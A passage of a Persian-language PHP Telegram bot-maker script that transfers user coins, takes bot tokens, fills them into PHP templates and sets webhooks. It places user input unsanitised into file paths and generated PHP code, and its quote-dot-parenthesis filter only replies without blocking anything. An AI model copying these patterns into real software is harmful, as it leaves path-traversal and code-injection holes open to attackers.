💥دستورات در ربات فادر💥
《@Botfather》



🔥ساخت ربات جدید⬇️
/newbot 

🔥دریافت توکن ربات های ساخته شده⬇️
/token 

🔥تغییر دادن توکن ربات های ساخته شده⬇️
/revoke 

🔥تغییر نام ربات های شما⬇️
/setname 

🔥اضافه کردن متن توضیحات ربات ها⬇️
/setdescription 

🔥تعیین کردن متن درباره اطلاعات ربات شما⬇️
/setabouttext 

🔥تغییر دادن عکس ربات ها⬇️
/setuserpic 

🔥اضافه کردن اینلاین⬇️
/setinline

🔥درخواست دریافت موقعیت⬇️
/setinlinegeo 

🔥تنظیمات اینلاین⬇️
/setinlinefeedback

🔥تنظیم دستورات ربات که با / شروع میشود⬇️
/setcommands

🔥تنظیم عضویت در گروه که با فعال بودن و غیر فعال بودن کار میکنه⬇️
/setjoingroups 

🔥به پیام ها در گروه دسترسی داشته باشد⬇️
/setprivacy

🔥حذف کردن ربات⬇️
/deletebot 

🔥لغو آخرین عملیات⬇️
/cancel


〰️〰️〰️〰️〰️〰️〰️〰️
",
'parse_mode'=>"HTML",  
'reply_to_message_id'=>$message_id, 
]);
}

elseif($bloxk !== "ok" && $state == "oo" && $text1 != "🔙 | بازگشت‌"){
 if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
            bot('sendmessage',[
            'chat_id' => $chat_id,
            'text' => "
            گوه نخور :|
            ",
            ]);
    }
    }

//===================انتقال سکه====//
elseif($text =="🕊️ | انتقال امتیاز"){
if($coin >= 10){
file_put_contents("dataPaMicK/$from_id/state.txt","kodom");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
آیدی عددی فرد مورد نظر را جهت انتقال ارسال پیام کنید 

⚠️ این عملیات غیر قابل بازگشت است
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
متاسفانه برای انتقال سکه باید حداقل 10 سکه داشته باشید 😅🩸
",
'parse_mode'=>'HTML',
]);
}
}
if($state == "kodom" && $text !="🔙 | بازگشت‌"){
if(file_exists("dataPaMicK/$text/state.txt")){
file_put_contents("dataPaMicK/$from_id/kodom.txt","$text");
file_put_contents("dataPaMicK/$from_id/state.txt","ine");
SendMessage($chat_id,"
💎 تعداد سکه برای انتقال به فرد مورد نظر را وارد کنید : 
💵؛ ایدی عددی کاربر  مورد نظر : $text","html","true");
}else{
file_put_contents("dataPaMicK/$from_id/state.txt","none");
file_put_contents("dataPaMicK/$from_id/kodom.txt","none");
SendMessage($chat_id,"❌کاربر مورد نظر در ربات عضو نیست❌","html","true");
}
}
if($state == "ine" && $text !="🔙 | بازگشت‌"){
$textt = abs($text);
if($coin > $textt){
$kodom = file_get_contents("dataPaMicK/$from_id/kodom.txt");
$kame = $coin - $textt;
file_put_contents("dataPaMicK/$from_id/coin.txt","$kame");
$Ok = file_get_contents("dataPaMicK/$kodom/coin.txt");
$kamas = $Ok + $textt;
file_put_contents("dataPaMicK/$kodom/coin.txt","$kamas");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
🎉؛《با موفقیت به تعداد $textt سکه به کاربر گرامی انتقال داده شد 》
",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}else{
file_put_contents("dataPaMicK/$from_id/state.txt","none");
file_put_contents("dataPaMicK/$from_id/kodom.txt","none");
SendMessage($chat_id,"❌متاسفانه سکه شما برای انتقال کافی نمی باشد❌","html","true");
}
$kodom = file_get_contents("dataPaMicK/$from_id/kodom.txt");
SendMessage($kodom,"کاربرگرامی 🌹
👤 کاربر @$username تعداد $textt سکه به شما هدیه داد 🌹❤️","html","true");
file_put_contents("dataPaMicK/$from_id/kodom.txt","none");
}
//==================================================\\
elseif($text1 == "🤖 ربات من"){
if($user['bots'] != null){
file_put_contents("dataPaMicK/$from_id/step.txt","chekbot");
file_put_contents("dataPaMicK/$from_id/$from_id.json",json_encode($user));
foreach($user['bots'] as $key => $name){
$name = $user['bots'][$key];
$bots[] = [['text'=>"🤖 $name"]];
}
$bots = json_encode(['keyboard'=> $bots , 'resize_keyboard'=>true]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لیست ربات های شما 👇️",
'reply_markup'=>$bots,
'reply_to_message_id'=>$message_id,
]);
}else{
SendMessage($chat_id,"شما رباتی در سرور $namebot ندارید 📛", null, $message_id);
}
}

elseif($step == "chekbot" and strpos($text, "🤖 ") !== false){
$botid = str_replace("🤖 @", null, $text);
if(in_array("@".$botid, $user['bots'])){
file_put_contents("dataPaMicK/$from_id/$from_id.json",json_encode($user));
  bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
اطلاعات ربات شما به شرح زیر است : 👇

ایدی ربات : @$botid 🤖
",   
'parse_mode'=>"html",  
'reply_markup'=>$menu,
 ]); 
  $first_name = str_replace(["<",">"], null, $first_name);
 }else{
  SendMessage($chat_id,"⚠️ هشدار : این متن مورد تایید ما نیست تکرار نکنید.", null, $message_id);
 }
}


elseif($text1 == "🤖 | چت جی پی تی"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 20){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","chat");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
$texttokeen",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
جهت ساخت این ربات به 20 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
",
'parse_mode'=>'HTML',
]);
        }
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
elseif($bloxk !== "ok" && $state == "chat" and $text != 'بازگشت ↪️'){
	 if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
            bot('sendmessage',[
            'chat_id' => $chat_id,
            'text' => "
            باشه فهمیدیم 😒
            ",
            ]);
    }
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$idbots = $resultb["result"]["id"];
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
		if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن شما درست نمیباشد لطفا توکن درست رو ارسال کنید ⛔
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
" ]);
if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/data");
mkdir("PaMicKCreaT/$un/data/users");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$Cop = file_get_contents("dataPaMicK/$chat_id/Cop.txt");
$all = explode("\n", $Cop);	
$class = file_get_contents("source/chat/indexch.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[BOOT]", $un, $class);
$class = str_replace("[*[IDBOOT]*]",$idbots,$class);
$class = str_replace("[CHANNEEL]",$all[0],$class);
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/indexch.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/channel.txt",$all[0]);
file_put_contents("dataPaMicK/bot/$un/bot.txt","chat");
file_put_contents("dataPaMicK/bot/$un/jdf.php",$jdf);
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
file_put_contents("PaMicKCreaT/$un/indexch.php",$class);
$txt = urlencode("ربات شما با موفقیت ساخته شد با دستور /start ربات خود را استارت کنید و با دستور /panel وارد پنل مدیریتی ربات خود شوید 🗂");
file_get_contents("https://api.telegram.org/bot".$text."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/indexch.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 🤖 | چت جی پی تی

ایدی ربات : @$un 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
    file_put_contents('databaceBot/' . $from_id, '1');
} else {
    file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 20;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}

elseif($text1 == "❤️ | لایک ساز"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 50){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","LikeSaz");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
$texttokeen",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
جهت ساخت این ربات به 50 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
",
'parse_mode'=>'HTML',
]);
}
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
elseif($bloxk !== "ok" && $state == "LikeSaz" and $text != 'بازگشت ↪️'){
	 if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
            bot('sendmessage',[
            'chat_id' => $chat_id,
            'text' => "
            باشه فهمیدیم 😒
            ",
            ]);
    }
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$idbots = $resultb["result"]["id"];
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
		if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن شما درست نمیباشد لطفا توکن درست رو ارسال کنید ⛔
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
" ]);

if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/data");
mkdir("PaMicKCreaT/$un/like");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$Cop = file_get_contents("dataPaMicK/$chat_id/Cop.txt");
$all = explode("\n", $Cop);	
$class = file_get_contents("source/LikeSaz/index.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/index.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/channel.txt",$all[0]);
file_put_contents("dataPaMicK/bot/$un/bot.txt","LikeSaz");
file_put_contents("dataPaMicK/bot/$un/jdf.php",$jdf);
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
file_put_contents("PaMicKCreaT/$un/index.php",$class);
$txt = urlencode("ربات شما با موفقیت ساخته شد با دستور /start ربات خود را استارت کنید و با دستور /panel وارد پنل مدیریتی ربات خود شوید 🗂");
file_get_contents("https://api.telegram.org/bot".$text."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/index.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : ❤️ | لایک ساز

ایدی ربات : @$un 🤖

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
    file_put_contents('databaceBot/' . $from_id, '1');
} else {
    file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 50;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}

elseif($text1 == "🤡 | سرگرمی گروه"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 10){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","Sokhan");
 bot('sendMessage',[
         'chat_id'=>$chat_id,
         'text'=>"
لطفا ایدی چنل خودتون را بدون @ برای ما ارسال کنید 🔰
",
        'parse_mode'=>'HTML',
        'reply_markup'=>json_encode([
        'keyboard'=>[
        [['text'=>"🔙 | بازگشت‌"]],
        ],
        'resize_keyboard'=>true
        ])
        ]);
        }else{
bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
        bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
جهت ساخت این ربات به 10 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
        ",
        'parse_mode'=>'HTML',
        ]);
                }
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
elseif($bloxk !== "ok" && $state == "Sokhan" && $text !="بازگشت ↪️" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
باشه فهمیدیم 😒
",
]);
}
       file_put_contents("dataPaMicK/$chat_id/Cop.txt",$text);
        file_put_contents("dataPaMicK/$from_id/state.txt","Sokhank");
bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"$texttokeen",
        'parse_mode'=>'Markdown', 
        'reply_markup'=>json_encode([ 
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"🔙 | بازگشت‌"]],
        ]
        ])
        ]);
}
elseif($bloxk !== "ok" && $state == "Sokhank" and $text != 'بازگشت ↪️'){
	 if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
            bot('sendmessage',[
            'chat_id' => $chat_id,
            'text' => "
            باشه فهمیدیم 😒
            ",
            ]);
    }
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$idbots = $resultb["result"]["id"];
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
		if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن شما درست نمیباشد لطفا توکن درست رو ارسال کنید ⛔
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
" ]);

if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/data");
mkdir("PaMicKCreaT/$un/data/users");
mkdir("PaMicKCreaT/$un/data/kalamat");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$Cop = file_get_contents("dataPaMicK/$chat_id/Cop.txt");
$all = explode("\n", $Cop);	
$class = file_get_contents("source/Sokhan/indexs.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[BOOT]", $un, $class);
$class = str_replace("[*[IDBOOT]*]",$idbots,$class);
$class = str_replace("[CHANNEEL]",$all[0],$class);
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/indexpa.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/bot.txt","Payam");
file_put_contents("dataPaMicK/bot/$un/jdf.php",$jdf);
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
file_put_contents("PaMicKCreaT/$un/indexs.php",$class);
file_put_contents("dataPaMicK/bot/$un/channel.txt",$all[0]);
$txt = urlencode("ربات شما با موفقیت ساخته شد با دستور /start ربات خود را استارت کنید و با دستور /panel وارد پنل مدیریتی ربات خود شوید 🗂");
file_get_contents("https://api.telegram.org/bot".$text."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/indexs.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 🤡 | سرگرمی گروه

ایدی ربات : @$un 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
    file_put_contents('databaceBot/' . $from_id, '1');
} else {
    file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 10;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}

elseif($text1 == "🌐 | پروکسی گذار"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 35){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","proxys");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
لطفا ایدی چنل خودتون را بدون @ برای ما ارسال کنید 🔰

بعد از ساخت ربات حتما ربات رو ادمین چنلتون کنید
ربات خودکار داخل چنل پروکسی میزاره نیازی به استارت ربات نیست!
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
جهت ساخت این ربات به 35 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
",
'parse_mode'=>'HTML',
]);
}
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}

elseif($bloxk !== "ok" && $state == "proxys" && $text !="بازگشت ↪️" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
باشه فهمیدیم 😒
",
]);
}
file_put_contents("dataPaMicK/$chat_id/Cop.txt",$text);
file_put_contents("dataPaMicK/$from_id/state.txt","proxysks");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
هر چند دقیقه یکبار پروکسی ارسال کنیم؟
از منوی زیر انتخاب کنید !
",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"5 دقیقه یکبار"],['text'=>"1 دقیقه یکبار"]],
[['text'=>"30 دقیقه یکبار"],['text'=>"10 دقیقه یکبار"]],
[['text'=>"120 دقیقه یکبار"],['text'=>"60 دقیقه یکبار"]],
[['text'=>"300 دقیقه یکبار"],['text'=>"180 دقیقه یکبار"]],
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}

elseif($bloxk !== "ok" && $state == "proxysks" && $text !="بازگشت ↪️" ){
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
باشه فهمیدیم 😒
",
]);
}
if($text == "1 دقیقه یکبار" or $text == "5 دقیقه یکبار" or $text == "10 دقیقه یکبار" or $text == "30 دقیقه یکبار" or $text == "60 دقیقه یکبار" or $text == "120 دقیقه یکبار" or $text == "180 دقیقه یکبار" or $text == "300 دقیقه یکبار"){

if($text == "1 دقیقه یکبار"){
$time = 1;
}
if($text == "5 دقیقه یکبار"){
$time = 5;
}
if($text == "10 دقیقه یکبار"){
$time = 10;
}
if($text == "30 دقیقه یکبار"){
$time = 30;
}
if($text == "60 دقیقه یکبار"){
$time = 60;
}
if($text == "120 دقیقه یکبار"){
$time = 120;
}
if($text == "180 دقیقه یکبار"){
$time = 180;
}
if($text == "300 دقیقه یکبار"){
$time = 300;
}

$Cop = file_get_contents("dataPaMicK/$chat_id/Cop.txt");
